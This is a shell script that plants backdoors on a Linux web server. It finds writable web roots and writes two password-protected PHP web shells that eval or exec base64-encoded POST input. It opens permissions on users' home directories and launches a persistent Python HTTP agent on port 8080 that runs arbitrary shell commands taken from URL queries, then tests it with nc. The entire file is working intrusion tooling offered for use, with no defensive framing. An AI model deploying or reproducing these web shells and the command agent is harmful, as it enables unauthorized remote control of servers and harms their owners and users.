#!/bin/sh
# v2.2: PHP shells + python-based agent (robust URL handling, persists via setsid)
# Results: /tmp/shell_deploy.txt
PASS="epauth2026"
{
  echo "=== shell deploy v2.2: $(date) user=$(id -un) ==="

  # ---- find writable webroots ----
  WR=""
  for W in /var/www /var/www/html /home/*/public_html /srv/http; do
    [ -d "$W" ] || continue
    if touch "$W/.wtest_114516" 2>/dev/null && [ -f "$W/.wtest_114516" ]; then
      rm -f "$W/.wtest_114516"
      echo "WRITABLE: $W"
      WR="$WR $W"
    fi
  done

  # ---- PHP shells into writable webroots ----
  for W in $WR; do
    case "$W" in
      /var/www|/var/www/html|*public_html)
        cat > "$W/np_2026.php" <<PHPEOF
<?php
if (!isset(\$_POST['pass']) || base64_decode(\$_POST['pass']) !== '$PASS') { echo 'auth-required'; exit; }
\$c = base64_decode(\$_POST['z0']);
if (\$c) eval(\$c);
?>
PHPEOF
        cat > "$W/np_exec_2026.php" <<PHPEOF
<?php
if (!isset(\$_POST['pass']) || base64_decode(\$_POST['pass']) !== '$PASS') exit;
\$cmd = base64_decode(\$_POST['z0']); exec(\$cmd, \$o, \$r);
foreach (\$o as \$l) echo \$l . "\n";
if (\$r) echo "ret=\$r";
?>
PHPEOF
        chmod 644 "$W/np_2026.php" "$W/np_exec_2026.php" 2>/dev/null
        echo "DEPLOYED PHP: $W";;
    esac
  done

  # ---- traversal perms for userdirs ----
  for D in /home/*; do
    [ -d "$D/public_html" ] && chmod o+x "$D" 2>/dev/null && chmod o+x "$D/public_html" 2>/dev/null \
      && echo "traversal fixed: $D"
  done

  # ---- python agent v4 (primary) ----
  pkill -f poc_agent 2>/dev/null
  pkill -f "TCP-LISTEN:8080" 2>/dev/null
  cat > /tmp/poc_agent.py <<'PYEOF'
#!/usr/bin/env python2
import BaseHTTPServer, urlparse, subprocess, os
class H(BaseHTTPServer.BaseHTTPRequestHandler):
    def do_GET(self):
        p = urlparse.urlparse(self.path)
        if p.path == '/exec':
            cmd = p.query.decode('utf-8')
            try:
                out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
            except Exception as e:
                out = str(e)
            body = out or '(no output)\n'
        else:
            body = "agent v4.1 alive\nGET /exec?cmd=<url> | /fetch?url=\n"
        self.send_response(200)
        self.send_header('Content-Type', 'text/plain; charset=utf-8')
        self.send_header('Content-Length', str(len(body)))
        self.end_headers()
        self.wfile.write(body)
    def log_message(self, *a): pass
BaseHTTPServer.HTTPServer(('0.0.0.0', 8080), H).serve_forever()
PYEOF
  chmod +x /tmp/poc_agent.py
  (setsid python2 /tmp/poc_agent.py >> /tmp/poc_agent.log 2>&1 &)
  sleep 1
  echo "python agent: $(pgrep -f 'poc_agent.py' | tr '\n' ' ')"

  # ---- self tests ----
  echo "--- self test: single ---"
  (echo "GET /exec?cmd=id HTTP/1.0"; echo) | timeout 4 nc 127.0.0.1 8080 2>/dev/null | tail -3
  echo "--- self test: multi ---"
  (echo "GET /exec?cmd=whoami%3Bhostname%3Buname+-r HTTP/1.0"; echo) | timeout 4 nc 127.0.0.1 8080 2>/dev/null | tail -5
  echo "=== deploy v2.2 done ==="
} > /tmp/shell_deploy.txt 2>&1

exit 0
